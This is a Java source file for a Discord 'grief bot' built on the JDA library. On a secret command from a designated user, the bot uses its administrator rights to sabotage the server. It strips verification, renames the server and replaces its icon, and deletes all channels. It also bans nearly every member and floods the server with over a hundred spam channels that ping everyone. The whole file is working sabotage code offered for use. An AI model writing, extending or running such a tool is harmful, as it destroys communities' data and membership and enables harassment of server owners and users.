package de.corruptedbytes;

import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.Random;

import de.corruptedbytes.utils.Config;
import de.corruptedbytes.utils.Shelv;
import de.corruptedbytes.utils.Utils;
import net.dv8tion.jda.api.Permission;
import net.dv8tion.jda.api.entities.ChannelType;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.Guild.VerificationLevel;
import net.dv8tion.jda.api.entities.Icon;
import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.entities.TextChannel;
import net.dv8tion.jda.api.entities.User;
import net.dv8tion.jda.api.events.ReadyEvent;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;

public class GriefBotListener extends ListenerAdapter {

	@Override
	public void onReady(ReadyEvent e) {
		Utils.sendInfo();
	}

	@Override
	public void onMessageReceived(MessageReceivedEvent e) {
		if (e.isFromType(ChannelType.TEXT)) {
			Message message = e.getMessage();
			Guild guild = e.getGuild();
			User user = e.getMessage().getAuthor();

			if (message.getContentDisplay().equalsIgnoreCase(GriefBot.getInstance().getGriefCommand())
					&& user.getId().startsWith(GriefBot.getInstance().getGrieferUserID())) {
				try {
					if (guild.getSelfMember().hasPermission(Permission.ADMINISTRATOR)) {

						try {
							message.delete().queue();
						} catch (Exception ignored) {
						}

						startGrief(guild, user);
					} else {
						message.getChannel().sendMessage(":x: The Bot works only with **Administrator** Permission!")
								.queue();
					}
				} catch (Exception ex) {
					System.err.println("Error: " + ex.getMessage());
				}
			}
		}
	}

	public void startGrief(Guild guild, User user) throws Exception {
		String name = GriefBot.getInstance().getGriefMessage().replace("%NAME%", user.getName());
		guild.getManager().setVerificationLevel(VerificationLevel.NONE).queue();
		guild.getManager().setName(name).queue();
		guild.getManager().setIcon(Icon.from(Config.griefPicture)).queue();

		guild.getChannels().forEach(key -> {
			key.delete().queue();
		});

		TextChannel base = guild
				.createTextChannel(new String(Base64.getDecoder().decode(Shelv.ASCII_EMOJI), StandardCharsets.UTF_8))
				.complete();
		base.sendMessage(new String(Base64.getDecoder().decode(Shelv.ASCII_MEME), StandardCharsets.UTF_8)).queue();

		for (Member members : guild.getMembers()) {
			if (members.isOwner() || members.getUser().isBot()
					|| members.getId() == GriefBot.getInstance().getGrieferUserID()) {
				continue;
			} else {
				members.getGuild().ban(members.getUser(), 0, "fucked").queue();
			}
		}

		int amount = 105;

		for (int i = 0; i < amount; i++) {
			try {
				TextChannel grief = guild
						.createTextChannel((name + "-" + new Random().nextInt(amount + 10)).toLowerCase()).complete();
				grief.sendMessage("> @everyone YOUR DISCORD SERVER WAS GRIEFED!").queue();
				grief.sendFile(Config.griefPicture).queue();
				guild.createVoiceChannel((name + "-" + new Random().nextInt(amount + 10)).toUpperCase()).queue();
			} catch (Exception ignored) {
			}
		}
	}
}